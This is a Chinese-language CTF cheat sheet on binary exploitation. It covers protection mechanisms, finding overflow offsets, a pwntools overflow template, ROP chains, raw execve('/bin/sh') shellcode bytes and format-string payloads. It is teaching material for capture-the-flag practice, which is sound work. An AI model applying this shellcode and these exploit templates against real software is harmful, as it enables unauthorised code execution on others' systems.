# 💥 Pwn／二进制利用 CTF 速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Pwn-CTF.tr.md) • [🇬🇷 Ελληνικά](Pwn-CTF.el.md)

> **译注：** ROP 是面向返回编程，gadget 是可组合使用的短指令片段；`pop rdi; ret` 等行表示反汇编指令，不是 shell 命令。示例片段依赖题目中的架构、地址和偏移；pwntools 默认架构为 `i386`，“64-bit Linux”小节需要匹配目标架构的 context，参见 [官方 context 文档](https://docs.pwntools.com/en/stable/context.html)。`pattern create`／`pattern offset` 也依赖调试器扩展，不能假定原生 GDB 提供。

---

## 🔍 初步分析

```bash
# 检查保护机制
checksec binary

# 文件信息
file binary
ldd binary        # 依赖库

# 运行程序
./binary
ltrace ./binary   # 库函数调用
strace ./binary   # 系统调用
```

---

## 🛡️ 保护机制

| 保护机制 | 说明 | 绕过思路 |
|------------|-------------|--------|
| **NX** | 栈不可执行 | ROP |
| **ASLR** | 地址随机化 | 泄露地址后计算 |
| **PIE** | 二进制映像基址随机化 | 泄露二进制映像地址 |
| **Canary** | 栈保护值（stack cookie） | 泄露 canary 值 |
| **RELRO** | 全局偏移表（GOT）保护 | 使用其他技术 |

---

## 📏 缓冲区溢出

### 确定偏移
```bash
# 使用 pwntools
cyclic 200        # 生成模式串
cyclic -l 0x6161616a  # 查找偏移

# 使用 GDB
pattern create 200
pattern offset 0x6161616a
```

### 基础利用示例（pwntools）
```python
from pwn import *

p = process('./binary')
# p = remote('host', port)

offset = 64
payload = b'A' * offset
payload += p64(0xdeadbeef)  # 返回地址

p.sendline(payload)
p.interactive()
```

---

## 🔗 ROP（面向返回编程）

### 寻找 gadget（短指令片段）
```bash
ROPgadget --binary binary
ropper -f binary

# 常见 gadget
pop rdi; ret
pop rsi; pop r15; ret
ret                  # 用于栈对齐
```

### ROP 链（pwntools）
```python
from pwn import *

elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

# 构造利用链
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])

payload = b'A' * offset + rop.chain()
```

---

## 🐚 Shellcode（机器码片段）

### 64 位 Linux
```python
# pwntools shellcraft
shellcode = asm(shellcraft.sh())

# 手工编写
# execve("/bin/sh", NULL, NULL)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```

---

## 📚 格式化字符串

```bash
# 泄露数值
%p %p %p %p %p
%x %x %x %x %x

# 写入
%n - 写入已输出的字节数
%hhn - 写入一个字节
```

```python
# pwntools fmtstr
from pwn import *
fmtstr_payload(offset, {target_addr: value})
```

---

## 🛠️ 工具

| 工具 | 用途 |
|------|-----|
| **pwntools** | Python 二进制利用库 |
| **GDB + GEF** | 调试 |
| **ROPgadget** | 寻找 ROP gadget |
| **one_gadget** | 寻找 libc 中的 one-shot gadget |
| **checksec** | 检查保护机制 |

---

## 📋 Pwn 检查清单

```markdown
□ checksec binary
□ 寻找漏洞（溢出、格式化字符串）
□ 计算偏移
□ 检查保护机制
□ 构造利用（shellcode／ROP）
□ 在本地测试
□ 调整以适配远程环境
```

---

**返回 CTF:** [🏁 CTF 概览](./README.zh-CN.md)
